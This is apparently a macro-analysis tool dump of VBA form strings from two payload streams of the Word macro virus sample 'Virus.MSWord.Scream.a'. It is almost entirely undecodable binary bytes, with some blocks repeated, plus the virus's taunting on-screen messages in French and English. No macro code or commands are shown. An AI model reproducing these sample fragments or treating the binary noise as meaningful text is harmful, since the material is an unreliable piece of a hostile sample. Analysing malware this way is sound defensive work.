- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ulb7�H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BwvJ-G��[�.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5�g�<$SjȢy|�.���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���~�<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
wl��ek
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Qv�o�7ް
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{�_��5e��e,쀿�~�rGvHQ�'j�Ĕ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
YW�������#�7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Gy9����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P	ږ�<0�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�z F�8$g#КP��j�Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
II��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JyzR��wq�W4׷w�x*�g(wq�s!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��~�kc%Ӻ�^ƃ�>^^�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����J�ݽ#�O�ZV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*%'Q�!��w����\c�p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ڃhW8��خR�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�~�[!6~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d�h��u��}�5ŀc�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4�u��1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@��C͔u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��%���3��y�aL`Բ��F2�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Lb��5�'�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.9q=��R:)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ӐB���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f�����^*�c�F~�2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���*�n��یQ��/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���̚VR�6o2��$��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���%���&�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x!�}Az
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����`>"�Z�c���j����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���$�ߤq�p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;��K�e#n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ok��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;���ϖT-d��(���k����~���ܭQQKQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
EYX�����Ik�� �����RUQ����8_�7�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s��%CP��4*a%Q^��w��$�1��Z��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ȥ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
SxtQ�J�D#�xkF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y�;����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cOH�%q-`.`���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l���������8�ZVV���9��%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V��m3\*!d���$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��).��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ڶ:w6S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n49��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$%gs%+��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c�l~��cر�mI����"�ϳ^���[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,u[R|�~�H����^=���JN}��+���C}ٽec�`lm�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4{�ۭ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>��#�<\�	j�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��{�._
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_H�~i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
狗�-W�4��B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n��{r�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
狗�-W�4��G����KU�'搄`[�s�ܺ�����KU�'��x�|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}#I��!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.��x�|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}#I��{�._
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_H�~i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�˨{�._
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_H�~i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
狗�-W�4��B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n��{r�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
狗�-W�4��G����KU�'搄`[�s�ܺ�����KU�'��x�|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}#I��!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.��x�|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}#I��{�._
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_H�~i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�˨{�._
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_H�~i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
狗�-W�4��B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n��{r�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
狗�-W�4��G����KU�'搄`[�s�ܺ�����KU�'��x�|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}#I��!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.��x�|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}#I��{�._
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_H�~i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�˨{�._
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_H�~i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
狗�-W�4��B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n��{r�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
狗�-W�4��G����KU�'搄`[�s�ܺ�����KU�'��x�|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}#I��!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.��x�|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}#I��{�._
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_H�~i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�˨{�._
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_H�~i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
狗�-W�4��B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n��{r�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
狗�-W�4��G����KU�'搄`[�s�ܺ�����KU�'��x�|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}#I��!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.��x�|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}#I��{�._
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_H�~i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�˨{��E�+�C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E=ΌI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�yӷ�9��P�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n��B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��p���C��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tu vois ceci, c'est ton cauchemar... HAHAHAHAHA!!!!!!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�You see that, this is your nightmare... HAHAHAHAHA!!!!!!!|G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Boooouuu!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"2aq�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#$BR��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%3Cb��r������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"2Q#a�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/��+�1��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��j�f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�22/�5�$9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E�E�
y�6�2�#z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(�OK<:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:�X�Q=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)"���0�KҰ�)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���(�d��E헊H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"���z�%�uf#U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=%<�I#�Z�4���@�F¸
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R��Nv���8,�W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ג��>�_�P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J��T4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ț�/!��η2J�r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���C��^���2�Y9?�譃�08���9ҹ������0
-------------------------------------------------------------------------------
